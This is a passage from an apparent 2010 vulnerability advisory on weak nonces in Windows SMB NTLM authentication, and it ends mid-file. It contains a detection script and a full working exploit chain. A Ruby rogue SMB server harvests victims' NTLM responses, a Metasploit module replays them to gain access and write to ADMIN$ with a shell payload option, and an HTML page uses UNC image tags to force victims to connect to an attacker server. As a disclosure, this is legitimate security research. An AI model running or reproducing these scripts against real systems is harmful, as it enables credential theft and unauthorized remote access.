requesting authentication is bad enabling attackers to perform replay attacks. The SMB server easily generates duplicate 8-byte challenges.\r\n\r\nThe challenge/nonce prediction attack is feasible due to several factors including that the protocol leaks information that can be used by an attacker to calculate the internal state of the PRNG used to generate challenges.\r\n\r\n\r\n6.3.Detecting if the SMB service generates duplicate 8-byte challenges\r\n-----------------------------------------------------------------------\r\n\r\nDetecting the generation of duplicate challenges can be verified remotely by repeatedly sending \'SMB Negotiate Protocol Request\' packets to a Windows system with the \'Flags2\' field set to 0xc001 (disabling security signatures, extended attributes and extended security negotiation) recording the 8-byte challenges obtained from the server and waiting for duplicates.\r\n\r\nThe following Ruby script can be used to test for the presence of this vulnerability: \r\n\r\n====test2_ochoa_2010-0209.rb====:\r\n# test2_ochoa-2010-0209.rb\r\n# Windows SMB NTLM Authentication Weak Nonce Vulnerability detection script\r\n# This script will run in an infinite loop looking for duplicate challenges displaying a message\r\n# every time one is received.\r\n# (c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\r\n\r\nrequire \'socket\'\r\n\r\nchs = []\r\nattempts = 0\r\nhost = "" \r\nport = 445\r\nchallenges_filename = "challenges.log"\r\nduplicates_filename = "duplicates.log"\r\n\r\n\r\n\tprint "This script tests for the Windows SMB NTLM Authentication Weak Nonce Vulnerability\\n"\r\n\tprint "(c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\\n"\t\r\n\r\n\tif ARGV.size < 1 then\r\n\t\tprint "syntax: test2_ochoa-2010-0209.rb <host>\\n"\r\n\t\texit\r\n\tend\r\n\r\n\thost = ARGV[0]\r\n\t\r\n\tprint "Testing host " + host + "\\n"\r\n\r\n\tneg_proto_packet_1 = \r\n\t"00000054" +\r\n\t"ff534d4272000000001801c00000000000000000000000000000866100005480003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200"\r\n\r\n\r\n\tif File.file?( challenges_filename ) then\r\n\t\tFile.delete( challenges_filename )\r\n\tend\r\n\r\n\tif File.file?( duplicates_filename ) then\r\n\t\tFile.delete( duplicates_filename )\r\n\tend\r\n\r\nloop do\r\n\tso = TCPSocket.open(host, port)\r\n\tattempts = attempts + 1\r\n\r\n\tn = neg_proto_packet_1.scan(/../).map { |s| s.to_i(16) }\r\n\tj = n.pack("C*")\r\n\tso.write(j)\r\n\tresp = so.recvfrom(2000)\r\n\r\n\tj = resp.to_s[0x49..0x49+7]\r\n\tvuelta = j\r\n\r\n\r\n\ttest = j.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }\r\n\tchallenge = test.to_s\r\n\r\n\tso.close\r\n\r\n\tFile.open( challenges_filename , "a" ) { |f| f.write(challenge+"\\n") }\r\n\r\n\tif chs.include? challenge \r\n\t        puts "duplicate found!\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\n"\r\n\t\tndx = chs.index(challenge)\r\n\t\tprint "request #" + attempts.to_s + ", challenge=" + challenge + "\\n"\r\n\t\tprint "request #" + (ndx+1).to_s + \t", challenge=" + chs[ndx] + "\\n"\r\n\t\tFile.open( duplicates_filename , "a") { |f| f.write(challenge+"\\n") }\t\r\n\tend\r\n\r\n\tchs.push(challenge)\r\n\r\nend\r\n\r\n\r\n6.4.Exploiting duplicate challenges\r\n--------------------------------------\r\n\r\nThere are different ways to exploit duplicate challenges, including:\r\n\r\n\t(i) An attacker A can eavesdrop network traffic looking for NTLM authentication messages exchanged between client C and server S (\'SMB Negotiate Protocol Requests\' packets and \'SMB Negotiate Protocol Responses\' packets), storing challenges and their corresponding responses. The attacker A can then perform several authentication requests to server S until S returns a previously observed challenge (a duplicate).At that point attacker A will send the corresponding and previously recorded response.\r\n\r\n\tWe did not find so far any current Windows version (XP,Vista,7,etc) that by default or using some specific configuration, when acting as an SMB client, would generate the necessary \'SMB Negotiate Protocol Request\' packets with the correct values in the \'Flags2\' field to trigger the vulnerability when accessing a remote SMB service. Hence we were unable to collect duplicate challenges only by network sniffing.\r\n\r\n\tTests were performed with the third-party SMB client \'smbclient\' from the SAMBA project with the same negative results (tests were not exhaustive).\r\n\r\n\tSince this problem was also found on Windows versions as old as Windows NT4, this scenario might still be possible.\r\n\r\n\t(ii) An attacker A connects to system S and sends mutiple \'SMB Negotiate Protocol Request\' packets with the \'Flags2\' field set to 0xc001 to obtain several challenges, and stores them. The attacker A then forces a user U on system S to connect to his own specially crafted SMB server, for example by sending an email with multiple <IMG> tags with UNC links (e.g.: <IMG SRC=\\\\evilserver\\share\\a.jpg>) or a link to web server with similar <IMG> tags. Upon receiving the connections from system S,the attacker\'s SMB server will respond with the previously obtained challenges and will store the corresponding responses returned by the remote system. Attacker A has now a set of responses which are the challenges encrypted with user\'s U credentials.\r\n\tFinally, the attacker A will perform several authentication requests to system S until it returns one of the challenges obtained at the beginning of this attack, and at that point he will replay the corresponding and previously obtained response to gain access to system S as user U.\r\n\r\n\tIf user U has, for example, local administrator privileges on system S (not uncommon for Windows XP users, for example), remote code execution is possible via DCE/RPC over SMB. Even if user U has no administrator privileges attacker A can still access, for example, file shares accessible by user U and read/modify information.\r\n\r\n\tTests performed showed that challenges and responses obtained from a system S can be reused multiple times against that same system and other remote systems. We observed that challenges obtained from a system S were also returned by other remote systems. This means that attacker A only needs, in the best case scenario, to force user U to connect to his own specially crafted SMB server once. Of course, user U must have access (his credentials must be valid) to the other systems attacked. \r\n\r\n\tThis attack needs the victim to have port 445/tcp open and the attacker to be able to access that port. The victim also needs to be able to access port 445/tcp on the attacker\'s server (only once, to record responses. Subsequent attacks do not need the victim to access the attacker\'s system). \r\n\r\n\tThis simple attack using a \'brute-force\' approach to find duplicate challenges proved to be acceptably effective.\r\n\r\n\r\n6.4.1.Proof-of-Concept Exploit \r\n--------------------------------\r\n\r\nThe exploit implementation is twofolded:\r\n\r\n\t(i) setup_smb_weak_nonce.rb \t\r\n\r\n\t\tThis standalone Ruby script performs several connections to the victim sending \'SMB Negotiate Protocol Request\' packets to obtain 8000 challenges (the number of challenges to be obtained can be changed).\r\n\t\tAfter collecting 8000 challenges, it will listen on port 445/tcp for incoming SMB connections originated by the victim. For every connection received, it will send to the victim one of the previously obtained challenges and will store the corresponding response obtained.\r\n\t\tAs a simple example of a method to force the victim to connect to the attacker, the file \'conn.html\' is provided. This is a very simple HTML file with javascript code that will generate 1000 <IMG> tags with an UNC link to different image files. \r\n\t\tThe challenges and responses obtained are saved to the file \'fullcreds.log\'.\r\n\t\t\t\r\n\t(ii)  msf_smb_weak_nonce.rb\r\n\r\n\t\tThis metasploit module will perform connections to the victim until the server responds with one of the duplicate challenges stored in \'fullcreds.log\'. The module will then send the corresponding response to gain access to the victim\'s SMB service.\r\n\t\tFinally, after successful exploitation, the module will create the file \'owned.txt\' in the ADMIN$ share (c:\\windows) with the following text: "Windows SMB NTLM Authentication weak nonce vulnerability successfully exploited!".\r\n\t\tThis module can be easily modified to execute code on the remote system (given the target user has enough privileges).\r\n\r\nTo exploit the vulnerability repeat the following steps:\r\n\r\n\t\t1. copy msf_smb_weak_nonce.rb to <METASPLOIT_DIR>/modules/exploits/windows/smb\r\n\t\t2. Run setup_smb_weak_nonce.rb specifying the IP of the victim (e.g.: ruby setup_smb_weak_nonce.rb 192.168.10.1). After collecting the nonces the script will listen on port 445 for incoming SMB connections.\r\n\t\t3. Run Internet Explorer and load \'conn.html\'. This will produce 1000+ connections to the SMB server implemented by setup_smb_weak_noce.rb. \r\n\r\n\t\t(Note 1: setup_smb_weak_nonce.rb needs to be run as root to be able to listen on port 445/tcp) \r\n\t\t(Note 2: If you load \'conn.html\' with Internet Explorer and \'conn.html\' is stored on a local drive (e.g.:c:\\conn.html) it is possible Internet Explorer will prompt you to allow execution of the javascript code within \'conn.html\'. This is not a limitation of the attack, it is just an extra protection implemented by Internet Explorer, the \'conn.html\' does not even need to contain javascript code, it uses it just because it is convenient, you could just as easily \'hard-code\' all <IMG> tags. Also, loading the html file from the a local disk is not a real attack scenario, all of this is for demonstration purposes).\r\n\r\n\t\t4.After 1000 connections are received by setup_smb_weak_nonce.rb the script will terminate. The file \'fullcreds.log\' will be generated. Copy \'fullcreds.log\' to /tmp.\r\n\t\t5. run metasploit (msfconsole) and execute the following commands:\r\n\t\t-use windows/smb/msf_smb_weak_nonce\r\n\t\t-set RHOST <victim_ip>\r\n\t\t\tfor example: set RHOST 192.168.10.1\r\n\t\t-set payload windows/shell/bind_tcp\r\n\t\t-exploit\r\n\r\n\t\tThe metasploit module looks for \'fullcreds.log\' in \'/tmp\' by default. You can specify the location of the \'fullcreds.log\' file using the following command:\r\n\r\n\t\t-set CREDSFILE <path+filename>\r\n\r\n\t\tfor example:\r\n\t\t\t-set CREDSFILE /mydir/fullcreds.log\r\n\t\t\r\n\t\t\r\n\t\t6.the metasploit module will start performing connections to the victim until receiving a duplicate challenge for which there\'s a response in the \'fullcreds.log\' file. After successfully authenticating to the victim, the script will create the file \'owned.txt\' in c:\\windows via the ADMIN$ share (given the user exploited has enough privileges).\r\n\r\n\t\tPlease remember that this proof-of-concept exploit requires the targer user to have enough privileges (e.g.: local administrator) to access the ADMIN$ share remotely. However, the target user does need to have this privilege level in order for the attacker to exploit the vulnerability. For example: if the target user only has regular user privileges, an attacker can access the file shares that user has access to. Also, exploiting the vulnerabiliy and the level of access obtained are two different things.\r\n\r\n\t\tThis is just a proof-of-concept exploit, it can be improved and optimized.\r\n\t\t\r\n\r\nNext are all the previously mentioned files part of the proof-of-concept exploit:\r\n\r\n=====setup_smb_weak_nonce.rb======:\r\n\r\n# Windows SMB NTLM Authentication Weak Nonce Vulnerability\r\n# (c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\r\n# This script can be used to connect to the victim to obtain weak nonces\r\n# and then waiting for connections from the victim to have it encrypt those weak nonces for us\r\n# The victim can be \'forced\' to connect to this server using several methods, as an example\r\n# you can take a look at the conn.html file which creates an HTML document with several <IMG SRC> tags\r\n# that connect to this server.\r\n# The weak nonces, encrypted nonces, username and domainname are stored in the file fullcreds.log\r\n# to then be used with the msf_smb_weak_nonce.rb metasploit module for exploitation\r\n\r\nrequire \'socket\'\r\nrequire \'time\'\r\n\r\n\r\ndef collectnonces(host, port, num)\r\n\r\n\tcount = 1\r\n\tnonces = []\r\n\tnonces_filename = "nonces.log"\r\n\tf = 0\r\n\r\n \tif File.file?( nonces_filename ) then\r\n                File.delete( nonces_filename )\r\n        end\r\n\r\n\r\n\twhile 1 == 1 :\r\n\r\n\t\tneg_proto_packet_1 = \r\n\t\t"00000054" +\r\n\t\t"ff534d4272000000001801c00000000000000000000000000000866100005480003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200"\r\n\r\n\t\t#so = nil\r\n\t\tso = TCPSocket.open(host, port)\r\n\r\n\t\tn = neg_proto_packet_1.scan(/../).map { |s| s.to_i(16) }\r\n\t\tj = n.pack("C*")\r\n\t\tso.write(j)\r\n\t\tresp, x = so.recvfrom(2000)\r\n\r\n\t\tj = resp[0x49..0x49+7]\r\n\t\ttest = j.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }\r\n\t\t#puts "\\r" + test.to_s + "    "\r\n\r\n\t\t#so.close\r\n\r\n\t\t#sleep(0.1)\r\n\t\tf = 1\r\n\t\tnonces.each do |hay|\r\n\t\t\tif hay == test.to_s\r\n\t\t\t\tprint "duplicate! (#" + count.to_s + ", #" + f.to_s + ")\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\n"\r\n\t\t\tend\r\n\t\t\tf = f + 1\r\n\t\tend\r\n\r\n\t\tnonces << test.to_s\r\n\r\n\t\tchallenge =  (test.to_s + "\\n").to_s\r\n\t\tFile.open(nonces_filename, \'a\') { |f| f.write(challenge) }\r\n\t\tcount = count + 1\r\n\t\tprint "\\r# of nonces obtained: " + count.to_s + "                               "\r\n\r\n\t\t#\t if count % 100 == 0\r\n\t\t#                sleep(1)\r\n\t\t#        end\r\n\r\n\t\tif count == (num+1)\r\n\t\t\tprint "\\n"\r\n\t\t\treturn\r\n\t\tend\r\n\r\n\tend\r\nend\r\n\r\n# from metasploit...\r\n# framework-3.2/lib/rex/proto/smb/utils.rb\r\ndef time_unix_to_smb(unix_time)\r\n\tt64 = (unix_time + 11644473600) * 10000000\r\n\tthi = (t64 & 0xffffffff00000000) >> 32\r\n\ttlo = (t64 & 0x00000000ffffffff)\r\n\treturn [thi, tlo]\r\nend\r\n\r\ndef waitforcreds(thenonces, num)\r\n\r\n\tnonces_ndx =  0\r\n\tconn_num = 0\r\n\tmaxn = num \r\n\r\n\r\n\tneg_proto_response_1 = \r\n\t"00000051" + # NetBIOS Session Service header\r\n\t"ff534d4272000000008801c00000000000000000000000000000fffe00000000" + # SMB Header\r\n\t"1105000302000100041100000000010000000000fde30000007632d28015ca010000080c00e486962656d5869400000000"  # Negotiate Protocol Response\r\n\r\n\tsession_setupandx_access_denied = \r\n\t"00000023" + # NetBIOS Session Service Header\r\n\t"ff534d4273220000c08801c00000000000000000000000000000fffe00000400000000" + # SMB Header\r\n\t"000000" # Session and SetupX Response payload\r\n\r\n\r\n\tcreds_filename = "fullcreds.log"\r\n\r\n \tif File.file?( creds_filename ) then\r\n                File.delete( creds_filename )\r\n        end\r\n\r\n\r\n\tserver = TCPServer.open(445)\r\n\tloop {\r\n\r\n\t\tif conn_num > maxn\r\n\t\t\tThread.exit\r\n\t\t\treturn\r\n\t\tend\r\n\t\r\n\t\tThread.start(server.accept) do |client|\r\n\t\t\r\n\t\t\tconn_num = conn_num + 1\r\n\t\t\tif conn_num > maxn\r\n\t\t\t\tputs "done!"\r\n\t\t\t\tclient.close()\r\n\t\t\t\tserver.shutdown\r\n\t\t\t\tThread.exit\r\n\t\t\t\treturn\r\n\t\t\tend\r\n\t\t\tputs conn_num\r\n\r\n\r\n\t\t\t# (1) receive Negotiate Protocol Request\r\n\r\n\t\t\tq, x = client.recvfrom(2000)\r\n\t\t\tputs "neg proto request received"\r\n\t\t\tpid1 = q[0x1e]\r\n\t\t\tpid2 = q[0x1f]\r\n\t\t\tmulti1 = q[0x1e+4]\r\n\t\t\tmulti2 = q[0x1f+4]\r\n\r\n\t\t\t# (2) send Negotiate Protocol Response\r\n\r\n\t\t\t# set challenge in response packet \r\n\t\t\tputs thenonces[nonces_ndx].to_s\r\n\t\t\tneg_proto_response_1[146..146+15] = thenonces[nonces_ndx].chomp\r\n\t\t\t# TODO: SET CORRECT TIME\r\n\t\t\ttimehi, timelo = time_unix_to_smb(Time.now.to_i)\r\n\t\t\t# send packet \r\n\t\t\tn = neg_proto_response_1.scan(/../).map { |s| s.to_i(16) }\r\n\t\t\t# set process id\r\n\t\t\t#puts pid1\r\n\t\t\t#puts pid2\r\n\t\t\t#puts multi1\r\n\t\t\t#puts multi2\r\n\t\t\tn[0x1e] = pid1\r\n\t\t\tn[0x1f] = pid2\r\n\t\t\tn[0x1e+4] = multi1\r\n\t\t\tn[0x1f+4] = multi2\r\n\t\r\n\t\t\ts = ("%.8x" % timelo)\r\n\t\t\tss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr\r\n\r\n\t\t\tdlo = (ss.scan(/../)).map { |s| s.to_i(16) }\r\n\r\n\t\t\ts = ("%.8x" % timehi)\r\n\t\t\tss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr\r\n\r\n\t\t\tdhi = (ss.scan(/../)).map { |s| s.to_i(16) }\r\n\r\n\t\t\tn[0x3c..0x3c+3] = dlo\r\n\t\t\tn[0x40..0x40+3] = dhi\r\n\r\n\t\t\t# timezone = 0\r\n\t\t\t#n[0x45] = 0\r\n\t\t\t#n[0x46] = 0\r\n\t\t\tj = n.pack("C*")\r\n\t\t\tclient.write(j)\r\n\t\t\tputs "neg proto response sent"\r\n\r\n\t\t\t# (3) Receive Session Setup andX Request\r\n\t\t\tq, x = client.recvfrom(4000)\r\n\t\t\tputs "session setup andx request received!"\r\n\t\t\tpid1 = q[0x1e]\r\n\t\t\tpid2 = q[0x1f]\r\n\t\t\tmulti1 = q[0x1e+4]\r\n\t\t\tmulti2 = q[0x1f+4]\r\n\r\n\t\t\t# we assume the first request is anonymous\r\n\t\t\t# and we send back an Error: STATUS_ACCESS_DENIED\r\n\t\t\tn = session_setupandx_access_denied.scan(/../).map { |s| s.to_i(16) }\r\n\t\t\tn[0x1e] = pid1\r\n\t\t\tn[0x1f] = pid2\r\n\t\t\tn[0x1e+4] = multi1\r\n\t\t\tn[0x1f+4] = multi2\r\n\t\t\t#n[0x44/2] = pid1multi1\r\n\t\t\t#n[0x45/2] = multi2\r\n\t\t\t#n[0x3c/2] = pid1\r\n\t\t\t#n[0x3d/2] = pid2\r\n\t\t\t#puts n\r\n\r\n\t\t\tbegin\r\n\t\t\t\tj = n.pack("C*")\r\n\t\t\trescue\r\n\t\t\t\tputs $! \r\n\t\t\tend\r\n\t\t\r\n\t\t\tclient.write(j)\r\n\t\t\tputs "session setupandx access denied sent!"\r\n\r\n\t\t\t# (4) Receive Session Setup andX Request with creds\r\n\t\t\tq, x = client.recvfrom(4000)\r\n\t\t\tputs "session setup andx request with creds received!"\r\n\r\n\t\t\t# Get the ANSI Password \r\n\t\t\tansi_pwd = q[0x41..0x41+23]\r\n\t\t\tansi_pwd_s = (ansi_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s\r\n\t\t\tputs ansi_pwd_s\r\n\r\n\t\t\t# Get the Unicode Password\r\n\t\t\tunicode_pwd = q[0x59..0x59+23]\r\n\t\t\tunicode_pwd_s = (unicode_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s\r\n\t\t\tputs unicode_pwd_s\r\n\r\n\t\t\t# Get the username (0x71)\r\n\t\t\ti = 0\r\n\t\t\tv = 0\r\n\t\t\tusername = "" \r\n\t\t\twhile v == 0\r\n\t\t\t\tif q[0x71+i] == 0 and q[0x71+i+1] == 0\r\n\t\t\t\t\tv = 1\r\n\t\t\t\tend\r\n\t\t\t\tif q[0x71+i] != 0\r\n\t\t\t\t\tusername = username + q[0x71+i].chr\r\n\t\t\t\tend\r\n\t\t\t\ti = i + 1\r\n\t\t\tend\r\n\r\n\t\t\ti = 0x71 + i + 1\r\n\t\t\tdomain = ""\r\n\t\t\tv = 0\r\n\t\t\tk = 0\r\n\t\t\twhile v == 0:\r\n\t\t\t\tif q[i+k] == 0 and q[i+k+1] == 0\r\n\t\t\t\t\tv = 1\r\n\t\t\t\tend\r\n\t\t\t\tif q[i+k] != 0\r\n\t\t\t\t\tdomain = domain + q[i+k].chr\r\n\t\t\t\tend\r\n\t\t\t\tk = k + 1\r\n\t\t\tend\r\n\r\n\t\t\tputs username\r\n\t\t\tputs domain\r\n\r\n\t\t\tFile.open(creds_filename, "a") { |f| f.write( thenonces[nonces_ndx].to_s + "," + ansi_pwd_s + "," + unicode_pwd_s + "," + username + "," + domain + "\\n") }\r\n\t\r\n\t\t\tclient.close\r\n\t\t\tnonces_ndx = nonces_ndx + 1\r\n\r\n\t\tend\r\n \t}\r\n\r\nend\r\n\r\ndef savecreds(num)\r\n\r\n\tnonces = []\r\n\tnonces_filename = "nonces.log"\r\n\r\n\t# load nonces to send to victim \r\n\tdata = ""\r\n\tFile.open(nonces_filename, \'r\') { |f| data = f.read() }\r\n\tnonces = data.split(/\\n/)\r\n\r\n\t# wait for victim to encrypt the nonces\r\n\twaitforcreds(nonces, num)\r\n\r\nend\r\n\r\n\r\n\r\n# MAIN\r\n\r\n\tprint "Windows SMB NTLM Authentication weak nonce Vulnerability"\r\n\tprint "\\n(c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\\n"\r\n\t\r\n\tif ARGV.size < 1 then\r\n\t\tprint "syntax: setup_smb_weak_nonce.rb <target host> <optional:number_of_nonces_to_collect, by default:8000>\\n"\r\n\t\texit\r\n\tend\r\n\r\n\t\r\n\thost = ARGV[0]\r\n\tport = 445\r\n\tnonces_count = 8000\r\n\r\n\tif ARGV.size >= 2 then\r\n\t\tnonces_count = ARGV[1].to_i\r\n\tend\r\n\t\t\r\n\t\t\r\n\t# gather nonces by connecting to victim\r\n\t# nonces are saved to \'nonces.log\'\r\n\t# 100 = number of nonces to collect\r\n\tputs "collecting nonces..."\r\n\tcollectnonces(host, port, nonces_count)\r\n\tputs "done collecting nonces.."\r\n\r\n\t# now, we expect connections from the victim\r\n\t# so we can use those connections to have the victim\r\n\t# encrypt the nonces with the hases of his/her password\r\n\t#the connections can be forced by\r\n\t#using the classic technique of sending an email\r\n\t#with link to a web page, a web page that may contain html tags like\r\n\t#<img src="\\\\<attacker>\\pepe">\r\n\t# for each <img> tag the victim will initiate 4 connections (it retries automatically..)\r\n\t# so that\'s good for an attacker, lowers the number of\r\n\t# connections it needs to force from the victim\r\n\r\n\tputs "waiting for connections from victim"\r\n\tsavecreds(1000)\r\n\r\n\r\n====msf_smb_weak_nonce.rb====:\r\n# Windows SMB NTLM Authentication Weak Nonce Vulnerability\r\n# (c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\r\n# This metasploit module takes the file \'fullcreds.log\' and performs connections\r\n# to a SMB server on port 445 until it returns a nonce found in \'fullcreds.log\'\r\n# It then sends the corresponding response and gains access.\r\n##\r\n##\r\n\r\n\r\n=begin\r\n=end\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\r\n        include Msf::Exploit::Remote::DCERPC\r\n        include Msf::Exploit::Remote::SMB\r\n\t\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\t\t\r\n\t\t\t\'Name\'           => \'Windows SMB NTLM Authentication weak nonce exploit\',\r\n\t\t\t\'Description\'    => %q{\r\n\t\t\t\tThis module exploits the Windows SMB NTLM Authentication weak nonce vulnerability by Hernan Ochoa (hernan@ampliasecurity.com)\t\r\n\t\t\t},\r\n\t\t\t\'Author\'         => \r\n\t\t\t\t[ \r\n\t\t\t\t\t\'Hernan Ochoa (hernan@ampliasecurity.com)\'\r\n\t\t\t\t],\r\n\t\t\t\'License\'        => \'\',\r\n\t\t\t\'Version\'        => \'1\',\r\n\t\t\t\'Privileged\'     => true,\r\n\t\t\t\'DefaultOptions\' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'EXITFUNC\' => \'thread\'\r\n\t\t\t\t},\t\t\t\r\n\t\t\t\'Payload\'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'Space\'        => 8192,\r\n\t\t\t\t\t\'DisableNops\'  => true,\r\n\t\t\t\t\t\'StackAdjustment\' => -3500,\r\n\t\t\t\t},\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'URL\', \'http://www.hexale.org\' ],\r\n\t\t\t\t\t[ \'URL\', \'http://hexale.blogspot.com\']\r\n\t\t\t\t],\t\t\t\t\r\n\t\t\t\'Platform\'       => \'win\',\r\n\t\t\t\'Targets\'        => \r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'Automatic\', { } ],\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t],\r\n\t\t\t\'DisclosureDate\' => \'Feb 09 2010\',\r\n\t\t\t\'DefaultTarget\'  => 0 ))\r\n\t\t\t\r\n\t\t\tregister_options(\r\n\t\t\t\t[\r\n\t\t\t\t\t#OptAddress.new(\'SMBHOST\', [ false, "The target SMB server (leave empty for originating system)"]),\r\n\t\t\t\t\tOptString.new(\'CREDSFILE\', [true, "The file with the weak nonces and encrypted nonces created by setup_smb_weak_nonce.rb", "/tmp/fullcreds.log"])\r\n\t\t\t\t], self.class )\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\r\n\t\tprint "Windows SMB NTLM Authentication weak nonce Vulnerability exploit (c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\\n"\r\n\t\tfound = 0\r\n\t\t# load nonces to wait from victim\r\n\t\tnonces = []\r\n\t\tdata = ""\r\n\t\tcreds_filename = datastore["credsfile"]\r\n\t\tFile.open(creds_filename, \'r\') { |f| data = f.read() }\r\n\t\tlines = data.split(/\\n/)\r\n\t\tcreds = lines.map { |i|  i.split(/,/) }\r\n\t\tprint "target user: " + creds[0][3] + "\\n"\r\n\t\ttarget_domain = creds[0][4]\r\n\t\tprint "target domain: " + target_domain + "\\n"\r\n\r\n\t\ttarget_host = datastore[\'RHOST\']\t\r\n\r\n\t\tattempts = 0\r\n\t\trsock = nil\r\n\t\trport = nil\r\n\r\n\t\tprint "connecting to " + target_host + " and waiting for duplicate challenges...\\n"\r\n\r\n\t\twhile found == 0\r\n\t\t\tattempts = attempts + 1\r\n\t\t\tprint "\\rattempt/connection # " +  attempts.to_s + "               "\r\n\t\t\t#if attempts % 100\r\n\t\t\t#\tsleep(1)\r\n\t\t\t#end\r\n \t\t\t[445].each do |rport|\r\n\t\t\tbegin\r\n\t\t\t#rport = 445\r\n\t\t\t#begin\r\n        \t        \trsock = Rex::Socket::Tcp.create(\r\n\t\t\t\t\t\'PeerHost\'  => target_host,\r\n\t\t\t\t\t\'PeerPort\'  => rport,\r\n\t\t\t\t\t\'Timeout\'   => 3,\r\n\t\t\t\t\t\'Context\'   =>\r\n \t\t\t\t\t\t{\r\n\t\t\t\t\t\t\'Msf\'        => framework,\r\n\t\t\t\t\t\t\'MsfExploit\' => self,\r\n                                                }\r\n                                )\r\n\r\n                                break if rsock\r\n\t\t\trescue ::Interrupt\r\n\t\t\t\traise $!\r\n\t\t\trescue ::Exception => e\r\n\t\t\t\t\tprint_error("Error connecting to #{target_host}:#{rport} #{e.class} #{e.to_s}")\r\n\t\t      \tend\r\n             \t\tend\t\t\r\n\r\n\r\n\t\trclient = Rex::Proto::SMB::SimpleClient.new(rsock, rport == 445 ? true : false)\t\r\n\r\n\t\tbegin\r\n \t\t\trclient.login_split_start_ntlm1(target_domain)\r\n\t\trescue ::Interrupt\r\n\t\t\traise $!\r\n\t\trescue ::Exception => e\r\n\t\t\tprint_error("Could not negotiate NTLMv1 with #{target_host}:#{rport} #{e.class} #{e.to_s}")\r\n\t\t\traise e\r\n\t\tend\t\r\n\t\r\n\t\tif (not rclient.client.challenge_key)\r\n\t\t\tprint_error("No challenge key received from #{target_host}:#{rport}")\r\n\t\t\trsock.close\r\n\t\tend\r\n\r\n\t\t#puts "challenged received from target after we connected to it!"\r\n\t\t#puts rclient.client.challenge_key.class\r\n\r\n\t\tj = rclient.client.challenge_key\r\n\t\tenckey = j.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }\r\n\t\t#puts enckey.to_s\r\n\t\tndx = 0\r\n\t\tcreds.each do |item|\r\n\t\t\tif found == 0\r\n\t\t\t\tif item[0].to_s == enckey.to_s\r\n\t\t\t\t\tprint "\\nsaved nonce: " + item[0] + "\\n"\r\n\t\t\t\t\tprint "nonce obtained from server: " + enckey.to_s + "\\n"\r\n\t\t\t\t\tputs "duplicate received!\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a\\a"\r\n\t\t\t\t\tfound =  ndx\r\n\t\t\t\tend\r\n\t\t\tend\r\n\t          \tndx = ndx + 1\r\n       \t\tend\r\n\r\n\t\t#found = 1\r\n\t\tif found == 0\r\n\t\t\t#rsock.close\r\n\t\tend\r\n\t\r\n\t\tend\r\n\r\n\t\tputs "nonce index #{found}"\t\t\r\n\t\t#apwd = creds[found][1].scan(/../).map { |s| s.to_i(16) }\r\n\t\t#upwd = creds[found][2].scan(/../).map { |s| s.to_i(16) }\r\n\t\tapwd = creds[found][1]\r\n\t\tupwd = creds[found][2]\r\n\t\tusername = creds[found][3]\r\n\t\tdomain = creds[found][4]\r\n\t\tputs apwd.to_s\r\n\t\tputs upwd.to_s\r\n\t\tputs username\r\n\t\tputs domain\r\n\r\n\t\tbegin\r\n                \tres = rclient.login_split_next_ntlm1(\r\n                                        username,\r\n                                        domain,\r\n\t\t\t\t\t[ apwd.to_s].pack("H*"),\r\n\t\t\t\t\t[ upwd.to_s].pack("H*")\r\n                                        #[ (lm_hash ? lm_hash : "00" * 24) ].pack("H*"),\r\n                                        #[ (nt_hash ? nt_hash : "00" * 24) ].pack("H*")\r\n                                )\r\n                 rescue XCEPT::LoginError\r\n\t\t\tputs "error" \r\n                 end\r\n\r\n                  if (res)\r\n                             print_status("AUTHENTICATED as #{username}\\\\#{domain}...")\r\n                     else\r\n                                print_status("Failed to authenticate as #{username}\\\\#{domain}...")\r\n                 end\r\n\r\n\t\tputs "connecting to ADMIN$..."\r\n\t\trclient.connect("ADMIN$")\r\n\t\tfd = rclient.open("\\\\owned.txt", \'rwct\')\r\n\t\tfd << "Windows SMB NTLM Authentication weak nonce vulnerability successfully exploited!\\r\\n"\r\n\t\tfd.close\r\n\t\tputs "file created"\r\n\t\r\n\r\n\t\trsock.close\r\n\t\treturn\r\n\tend\r\n\r\n\r\nend\r\n\r\n====conn.html====:\r\n<HTML>\r\n<HEAD>\r\n<TITLE>Windows SMB NTLM Authentication weak nonce Vulnerability by Hernan Ochoa</TITLE>\r\n<!-- \r\nPlease modify the evilServerIP variable to be the IP address\\hostname of the server where \r\nthe script setup_smb_weak_nonce.rb is running\r\n// -->\r\n<SCRIPT LANGUAGE="JavaScript">\r\n<!--\r\nbeginHTML = "<IMG SRC=\\\\\\\\"\r\nevilServerIP = "192.168.1.130"\r\nendHTML = ">\\r\\n"\r\n// -->\r\n</SCRIPT>\r\n</HEAD>\r\n<BODY>\r\n<SCRIPT LANGUAGE="JavaScript">\r\n<!--\r\nfor(i=0; i<1000; i++) {\r\n\timageName = i + ".jpg"\r\n\tdocument.write(beginHTML + evilServerIP + "\\\\share\\\\" + imageName + endHTML);\r\n}\r\n// 